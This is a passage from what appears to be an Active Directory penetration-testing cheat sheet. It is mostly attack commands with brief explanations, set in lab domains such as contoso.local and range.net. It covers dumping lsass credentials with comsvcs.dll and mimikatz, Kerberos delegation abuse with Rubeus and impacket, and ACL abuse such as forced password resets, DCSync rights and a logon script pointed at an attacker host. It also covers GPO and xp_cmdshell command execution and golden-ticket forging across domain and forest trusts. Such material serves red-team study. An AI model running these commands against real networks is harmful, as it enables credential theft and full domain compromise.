+</span></span></code></pre></td></tr></table></div></div><a href=#unconstrained--constrained-object><h3 id=unconstrained--constrained-object><span class=hanchor arialabel=Anchor># </span>Unconstrained / Constrained Object</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># unconstrained computer
+</span></span><span class=line><span class=cl>Get-DomainComputer -Unconstrained -Properties name
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Constrained user/computer
+</span></span><span class=line><span class=cl>Get-DomainComputer -TrustedToAuth -Properties name,msds-allowedtodelegateto
+</span></span><span class=line><span class=cl>Get-DomainUser -TrustedToAuth -Properties name,msds-allowedtodelegateto
+</span></span></code></pre></td></tr></table></div></div><p>You can abuse these delegation permission by referring
+<a rel=noopener class="internal-link broken" data-src=#unconstrained-delegation>here</a></p><a href=#constrained-language-mode-clm--wdac--device-guard><h2 id=constrained-language-mode-clm--wdac--device-guard><span class=hanchor arialabel=Anchor># </span>Constrained Language Mode (CLM) / WDAC / Device Guard</h2></a><a href=#clm-enumeration><h3 id=clm-enumeration><span class=hanchor arialabel=Anchor># </span>CLM Enumeration</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ExecutionContext.SessionState.LanguageMode
+</span></span></code></pre></td></tr></table></div></div><a href=#view-applocker-rules><h3 id=view-applocker-rules><span class=hanchor arialabel=Anchor># </span>View AppLocker Rules</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
+</span></span></code></pre></td></tr></table></div></div><a href=#dump-lsass-process-with-signed-binary><h3 id=dump-lsass-process-with-signed-binary><span class=hanchor arialabel=Anchor># </span>Dump lsass process with signed binary</h3></a><p>This method will bypass CLM to dump lsass since we are using MS signed binary (whitelisted)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Run this in victim/remote computer
+</span></span><span class=line><span class=cl>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Tasks\lsass.dmp full
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Use pypykatz
+</span></span><span class=line><span class=cl>pypykatz lsa minidump lsass.dmp
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Use mimikatz&#39;s minidump
+</span></span><span class=line><span class=cl>mimikatz# sekurlsa::minidump &lt;Path_to_file&gt;\lsass.dmp
+</span></span><span class=line><span class=cl>mimikatz# sekurlsa::logonpasswords
+</span></span></code></pre></td></tr></table></div></div><a href=#delegations><h1 id=delegations><span class=hanchor arialabel=Anchor># </span>Delegations</h1></a><a href=#unconstrained-delegation><h2 id=unconstrained-delegation><span class=hanchor arialabel=Anchor># </span>Unconstrained Delegation</h2></a><a href=#printer-bug><h3 id=printer-bug><span class=hanchor arialabel=Anchor># </span>Printer Bug</h3></a><p>Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with <code>Rubeus</code>.</p><ol><li><p>Verify that remote computer has spooler service running</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls \\dc01.contoso.local\pipe\spoolss
+</span></span></code></pre></td></tr></table></div></div><p>``</p></li><li><p>Download spoolsample
+<a href=https://github.com/leechristensen/SpoolSample rel=noopener>here</a> and run the following command to authenticate and capture ticket.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># run this on domain joined computers
+</span></span><span class=line><span class=cl>spoolsample.exe dc01.contoso.local ms01.contoso.local
+</span></span><span class=line><span class=cl># or can use this command for linux workstation
+</span></span><span class=line><span class=cl>python3 printerbug.py contoso.local/donald:&#39;Changeme123&#39;@10.200.60.202 10.50.57.128
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># monitor ticket
+</span></span><span class=line><span class=cl>Rubeus.exe monitor /interval:5
+</span></span></code></pre></td></tr></table></div></div><p>``</p></li></ol><a href=#extract-tgt><h3 id=extract-tgt><span class=hanchor arialabel=Anchor># </span>Extract TGT</h3></a><p>Since unconstrained computers will save users tgt (logged in users). We will extract this keys and able to impersonate them.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mimikatz# sekurlsa::tickets /export
+</span></span><span class=line><span class=cl>Rubeus.exe ptt /ticket:ticket.kirbi
+</span></span></code></pre></td></tr></table></div></div><a href=#constrained-delegation><h2 id=constrained-delegation><span class=hanchor arialabel=Anchor># </span>Constrained Delegation</h2></a><a href=#s4u-delegation><h3 id=s4u-delegation><span class=hanchor arialabel=Anchor># </span>s4u delegation</h3></a><p>This attack is possible if <code>msds-AllowedToDelegateTo</code> is set.</p><ul><li>with rc4 hash in hand</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Request TGT + TGS
+</span></span><span class=line><span class=cl>Rubeus.exe s4u /user:attacker /rc4:&lt;rc4 hash&gt; /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,host,http /domain:contoso.local /dc:dc01.contoso.local /ptt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># impacket
+</span></span><span class=line><span class=cl>getST.py -spn cifs/TargetComputer.range.net &#39;range.net/FakeComputer$:newpassword123&#39; -impersonate administrator -dc-ip 192.168.86.182
+</span></span></code></pre></td></tr></table></div></div><ul><li>with owned user session (not knowing his rc4)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Request for ticket
+</span></span><span class=line><span class=cl>Rubeus.exe tgtdeleg /nowrap
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Request TGS with base64 blob ticket
+</span></span><span class=line><span class=cl>Rubeus.exe s4u /user:attacker /ticket:&lt;base64-blob&gt; /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,http,host /domain:contoso.local /dc:dc01.contoso.local /ptt
+</span></span></code></pre></td></tr></table></div></div><a href=#resource-based-constrained-delegation><h2 id=resource-based-constrained-delegation><span class=hanchor arialabel=Anchor># </span>Resource-Based Constrained Delegation</h2></a><p>This attack is possible if owned user/computer object has <em>GenericWrite</em> or write privilege to user/computer object attributes. Since we have write privilege, we can write to <em>msds-allowedtoactonbehalfofotheridentity</em> property. There are few requirements needed in order to perform this attack.</p><table><thead><tr><th>Name</th><th>Value</th></tr></thead><tbody><tr><td>Domain object with SPN set (computer/service acc)</td><td>mycomputer$</td></tr><tr><td>Principal&rsquo;s plain-text or hashes (rc4/aes-256)</td><td>Range2022!</td></tr></tbody></table><ol><li>Import ADModule</li><li>Set <em>msds-allowedtoactonbehalfofotheridentity</em> to owned computer/user objects.<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># AD-Module
+</span></span><span class=line><span class=cl>Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># pywerview
+</span></span><span class=line><span class=cl>Add-DomainObjectAcl -TargetIdentity dc01 -PrincipalIdentity mycomputer -Rights rbcd
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Get mycomputer$ ntlm hash or aes keys<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mimikatz# sekurlsa::logonpasswords
+</span></span></code></pre></td></tr></table></div></div>``</li><li>Apply s4u delegation (TGT+TGS)<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># rubeus
+</span></span><span class=line><span class=cl>Rubeus.exe s4u /user:mycomputer$ /rc4:&lt;rc4/ntlm hash&gt; /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># impacket 
+</span></span><span class=line><span class=cl>getST.py range.net/mssqlsvc:&#39;Range2022!&#39; -dc-ip 192.168.86.182 -spn cifs/dc01.range.net -impersonate Administrator
+</span></span></code></pre></td></tr></table></div></div>``</li></ol><a href=#references><h4 id=references><span class=hanchor arialabel=Anchor># </span>References</h4></a><ol><li><a href=https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff rel=noopener>Harmj0y&rsquo;s gist on abusing RBCD with PowerShell/PowerView/PowerMad</a></li><li><a href=https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution rel=noopener>ired.team</a></li></ol><a href=#aclsaces-abuse><h1 id=aclsaces-abuse><span class=hanchor arialabel=Anchor># </span>ACLs/ACEs Abuse</h1></a><a href=#force-change-user-password><h3 id=force-change-user-password><span class=hanchor arialabel=Anchor># </span>Force Change User Password</h3></a><p><em>Note: This doesn&rsquo;t require you to know the owned user&rsquo;s credential</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># PowerView
+</span></span><span class=line><span class=cl>Set-DomainUserPassword -Identity studentadmin -AccountPassword (ConvertTo-SecureString -AsPlainText -Force &#39;P@$$w0rd!&#39;)
+</span></span></code></pre></td></tr></table></div></div><a href=#change-password-with-credential><h3 id=change-password-with-credential><span class=hanchor arialabel=Anchor># </span>Change password with credential</h3></a><p><em>Note: Need to know owned user&rsquo;s password</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Create PSCredential Object
+</span></span><span class=line><span class=cl>$username=&#39;contoso\administrator&#39;
+</span></span><span class=line><span class=cl>$password=ConvertTo-SecureString -AsPlainText -Force &#39;P@$$w0rd!&#39;
+</span></span><span class=line><span class=cl>$cred = New-Object System.Management.Automation.PSCredential($username,$password)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Change password with PSCredential
+</span></span><span class=line><span class=cl>Set-DomainUserPassword -Identity studentadmin -Domain contoso.local -AccountPassword (ConvertTo-SecureString -AsPlainText -Force &#39;password123!&#39;) -Credential $cred
+</span></span></code></pre></td></tr></table></div></div><a href=#add-users-to-group><h3 id=add-users-to-group><span class=hanchor arialabel=Anchor># </span>Add Users to Group</h3></a><p>This command will add specific principal to a group that exists in the domain. <em>Note that there are several tools to perform this. Below are some of the methods that can be used. Checkout this cool tool
+<a href=https://github.com/CravateRouge/bloodyAD rel=noopener>bloodyAD</a></em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># PowerView
+</span></span><span class=line><span class=cl>Add-DomainGroupMember -Identity cadmins -Members lowpriv
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># net.exe
+</span></span><span class=line><span class=cl>net.exe group &#39;cadmins&#39; lowpriv /add /domain
+</span></span></code></pre></td></tr></table></div></div><a href=#targeted-kerberoast><h3 id=targeted-kerberoast><span class=hanchor arialabel=Anchor># </span>Targeted Kerberoast</h3></a><p>This technique will update <code>ServicePrincipalName</code> of a user object. Make sure to have a write permission on the user&rsquo;s attributes.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Set SPN
+</span></span><span class=line><span class=cl>## Windows
+</span></span><span class=line><span class=cl>Set-DomainObject -Identity sqlsvc -Set @{serviceprincipalname=&#39;my/sqlspn&#39;}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Clear SPN (OPSEC)
+</span></span><span class=line><span class=cl>Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
+</span></span></code></pre></td></tr></table></div></div><p>There is also a repo
+<a href=https://github.com/ShutdownRepo/targetedKerberoast rel=noopener>targetedKerberoast</a> to automatically discover ACLs from the current user context against other domain objects looking for <em>Write</em> permission on <code>servicePrincipalName</code> attribute.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 targetedKerberoast.py -u jsparrow -p Password123 -d range.net --dc-ip 10.10.10.10
+</span></span></code></pre></td></tr></table></div></div><a href=#overwrite-logon-script><h3 id=overwrite-logon-script><span class=hanchor arialabel=Anchor># </span>Overwrite Logon Script</h3></a><p>Logon Script will run everytime user logged in.<em>(note: use ad module)</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Set-ADObject -SamAccountName  -PropertyName scriptpath -PropertyValue &#34;\\attackerip\script.ps1&#34;
+</span></span></code></pre></td></tr></table></div></div><a href=#add-dcsync-privilege-to-object><h3 id=add-dcsync-privilege-to-object><span class=hanchor arialabel=Anchor># </span>Add DCSync Privilege to object</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Add-DomainObjectAcl -TargetIdentity &#34;DC=contoso,DC=local&#34; -PrincipalIdentity studentuser -Rights DCSync
+</span></span></code></pre></td></tr></table></div></div><a href=#read-laps-local-administrator-password><h3 id=read-laps-local-administrator-password><span class=hanchor arialabel=Anchor># </span>Read LAPS Local Administrator Password</h3></a><p>This will only possible if you have <em>AllExtendedRights</em> permission on a computer object.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Get-DomainComputer -Properties ms-mcs-admpwd
+</span></span></code></pre></td></tr></table></div></div><a href=#weak-gpo-permission><h1 id=weak-gpo-permission><span class=hanchor arialabel=Anchor># </span>Weak GPO Permission</h1></a><a href=#enumerate-weak-gpo-permission><h3 id=enumerate-weak-gpo-permission><span class=hanchor arialabel=Anchor># </span>Enumerate weak GPO Permission</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Domain wide
+</span></span><span class=line><span class=cl>Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs | ? {$_.activedirectoryrights -match &#34;GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner&#34;}}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># specific user (based on user&#39;s sid)
+</span></span><span class=line><span class=cl>Get-DomainGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name | ? {$_.ActiveDirectoryRights -match &#34;GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner&#34; -and $_.securityidentifier -match &#34;&lt;userssid&gt;&#34;}}
+</span></span></code></pre></td></tr></table></div></div><a href=#gpo-abuse-with-powerview><h3 id=gpo-abuse-with-powerview><span class=hanchor arialabel=Anchor># </span>GPO Abuse with PowerView</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Execute specific tasks
+</span></span><span class=line><span class=cl>New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments &#39;net.exe localgroup administrators dummyuser /add&#39; -Force
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># update GPO (must run)
+</span></span><span class=line><span class=cl>gpoupdate /force
+</span></span></code></pre></td></tr></table></div></div><a href=#sql-server-enumeration-and-code-execution><h1 id=sql-server-enumeration-and-code-execution><span class=hanchor arialabel=Anchor># </span>SQL Server Enumeration and Code Execution</h1></a><p>I did most of my SQL Server Enumeration by using this
+<a href=https://github.com/NetSPI/PowerUpSQL rel=noopener>PowerUpSQL.ps1</a> script. Refer to more commands in this
+<a href=https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet rel=noopener>PowerUpSQL Cheatsheet</a></p><a href=#get-sql-instances><h3 id=get-sql-instances><span class=hanchor arialabel=Anchor># </span>Get SQL Instances</h3></a><p>This method will allow you to enumerate local or domain sql servers(if any).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Get Local Instance
+</span></span><span class=line><span class=cl>Get-SQLInstanceLocal -Verbose
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Get Domain Instance
+</span></span><span class=line><span class=cl>Get-SQLInstanceDomain -Verbose
+</span></span></code></pre></td></tr></table></div></div><a href=#get-sql-linked-server><h3 id=get-sql-linked-server><span class=hanchor arialabel=Anchor># </span>Get SQL Linked Server</h3></a><p>This command will allow you to enumerate linked sql server to selected instance. Output of the command also shows privilege that you currently have on specific sql server</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Enumerate Linked Server (show just instace and priv)
+</span></span><span class=line><span class=cl>Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Enumerate Linked Server and Execute SQL Query
+</span></span><span class=line><span class=cl>Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local -Query &#39;exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;
+</span></span></code></pre></td></tr></table></div></div><a href=#execute-remote-sqlquery><h3 id=execute-remote-sqlquery><span class=hanchor arialabel=Anchor># </span>Execute Remote SQLQuery</h3></a><p><em>Prerequisite:</em></p><ul><li>Make sure you are <strong>sa</strong> user (high privileged user)</li><li>Make sure to enable <code>xp_cmdshell</code> before executing os command</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Enable xp_cmdshell
+</span></span><span class=line><span class=cl>Get-SQLQuery -Query &#39;EXECUTE(&#39;&#39;sp_configure &#39;&#39;&#39;&#39;xp_cmdshell&#39;&#39;&#39;&#39;,1;reconfigure;&#39;&#39;) AT &#34;DB-SQLSRV&#34;&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Execute OS command
+</span></span><span class=line><span class=cl>Get-SQLQuery -Query &#39;EXECUTE(&#39;&#39;xp_cmdshell &#39;&#39;&#39;&#39;whoami&#39;&#39;&#39;&#39;&#39;&#39;) AT &#34;DB-SQLSRV&#34;&#39;
+</span></span><span class=line><span class=cl>Invoke-SQLOSCmd -Instance DB-SQLSRV -Command &#34;whoami&#34;
+</span></span></code></pre></td></tr></table></div></div><a href=#domain-trust-hopping><h1 id=domain-trust-hopping><span class=hanchor arialabel=Anchor># </span>Domain Trust Hopping</h1></a><a href=#child-parent-domain-escalation><h3 id=child-parent-domain-escalation><span class=hanchor arialabel=Anchor># </span>Child-Parent Domain Escalation</h3></a><p>This attack made possible since there is no security boundary between domains. Hence we could forge a golden ticket that contains <em>extra sid</em> of a parent domain&rsquo;s <em>Enterprise Admins</em>. Below are the requirements to perform this attack:</p><table><thead><tr><th>Name</th><th>Value</th></tr></thead><tbody><tr><td>Child domain krbtgt hash</td><td><code>833ef1dcc490f88a8f4a8a00859736de</code></td></tr><tr><td>Child domain SID</td><td><code>S-1-5-21-3263068140-2042698922-2891547269</code></td></tr><tr><td>Child domain FQDN</td><td>child.domain.local</td></tr><tr><td>Parent domain EA SID</td><td><code>S-1-5-21-378720957-2217973887-3501892633-519</code></td></tr></tbody></table><ol><li><p>Forge a
+<a rel=noopener class="internal-link broken" data-src=#golden-ticket>Golden Ticket</a> that contains <em>extra sid</em> of the parent domain&rsquo;s Enterprise Admins.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># windows
+</span></span><span class=line><span class=cl>mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local [/ntlm|/aes256]:833ef1dcc490f88a8f4a8a00859736de /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-519 /ptt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># linux
+</span></span><span class=line><span class=cl>ticketer.py -nthash 833ef1dcc490f88a8f4a8a00859736de -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain child.domain.local -extra-sid S-1-5-21-378720957-2217973887-3501892633-519 Administrator
+</span></span></code></pre></td></tr></table></div></div><p>``</p></li><li><p>Use the ticket to perform Pass The Ticket (PTT) and win!. Ensure to use FQDN if you encounter any errors. <em>Note that if you ran mimikatz command with <code>/ptt</code> flag already does the following step. Hence you might want to skip this step</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>export KRB5CCNAME=Administrator.ccache
+</span></span><span class=line><span class=cl>secretsdump.py child.domain.local/Administrator@dc01.domain.local -just-dc -k -no-pass
+</span></span></code></pre></td></tr></table></div></div><p>``</p></li></ol><p>Above steps could be automated with
+<a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py rel=noopener>raiseChild.py</a> if you obtain a privileged account (i.e. Domain Admin). <em>-debug flag is &lt;3</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashes :2e8a408a8aec852ef2e458b938b8c071 -debug
+</span></span></code></pre></td></tr></table></div></div><a href=#forest-trust-hopping><h1 id=forest-trust-hopping><span class=hanchor arialabel=Anchor># </span>Forest Trust Hopping</h1></a><a href=#sid-history><h3 id=sid-history><span class=hanchor arialabel=Anchor># </span>SID History</h3></a><p>This attack path is only applicable when <strong>SID Filtering is disabled</strong> and <strong>SID History is enabled</strong>. You can read the in-depth
+<a href=https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d rel=noopener>blogpost</a> on this by harmj0y.</p><ol><li>Check for <code>trustAttributes</code> attribute. Make sure SID History is enabled<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Get-DomainTrust
+</span></span><span class=line><span class=cl>[[..snip..]]
+</span></span><span class=line><span class=cl>TrustAttributes : TREAT_AS_EXTERNAL
+</span></span><span class=line><span class=cl>[[..snip..]]
+</span></span></code></pre></td></tr></table></div></div>``
+If <em>TREAT_AS_EXTERNAL</em> flag is set in <strong>trustAtrributes</strong> property, that means forst-trust is now more relaxed as stated in this
+<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN" rel=noopener>documentation</a></li></ol><blockquote><p><em>If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering.</em> <strong><em>Cross-forest trusts are more stringently filtered than external trusts</em></strong><em>. This attribute relaxes those cross-forest trusts to be equivalent to external trusts.</em></p></blockquote><ol start=2><li>Forge Inter-Realm TGT with extra sids. We injected sid of trusted domain users with RID > 1000. This is because most <em>WELL-KNOWN-SID</em> is flag as <em>ForestSpecific</em> based on the
+<a href=https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280 rel=noopener>documentation</a></li></ol><blockquote><p>The ForestSpecific rule is for those SIDs that are never allowed in a PAC that originates from out of the forest or from a domain that has been marked as QuarantinedWithinForest, unless it belongs to that domain.</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>	mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:&lt;domain-sid&gt; /rc4:&lt;trust-key&gt; /service:krbtgt /target:fortress.local /sids:&lt;victim-user-sid&gt; /ticket:&lt;path&gt;\ticket.kirbi
